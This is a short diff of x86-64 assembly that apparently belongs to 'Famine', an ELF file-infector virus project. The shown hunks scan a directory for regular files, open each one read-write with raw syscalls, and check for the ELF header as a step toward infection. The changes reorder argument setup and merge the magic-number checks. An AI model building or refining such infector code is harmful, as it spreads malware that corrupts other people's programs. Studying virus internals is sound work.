@@ -74,7 +74,7 @@ section .text
             ; check if the file is DT_REG
             cmp byte [rdi + dirent.d_type], DT_REG
             jne .check_for_files_in_dirents
-
+        
             add rdi, dirent.d_name
 
             .openat:
@@ -82,8 +82,8 @@ section .text
                 push rax
 
                 ; openat(fd_dir, d_name (&rsi), O_RDWR);
-                mov rdi, VAR(Famine.fd_dir)
                 lea rsi, [rdi]
+                mov rdi, VAR(Famine.fd_dir)
                 mov rdx, O_RDWR
                 mov rax, SC_OPENAT
                 syscall
@@ -125,10 +125,7 @@ section .text
                 mov rax, SC_READ
                 syscall
 
-                cmp byte [rsp], 0x7F           ; magic number
-                jne .check_ehdr_error
-
-                cmp dword [rsp + 1], 0x464C45  ; "ELF"
+                cmp dword [rsp], MAGIC_NUMBERS           ; magic number
                 jne .check_ehdr_error
 
                 cmp byte [rsp + 4], 2     ; EI_CLASS = 64 bits
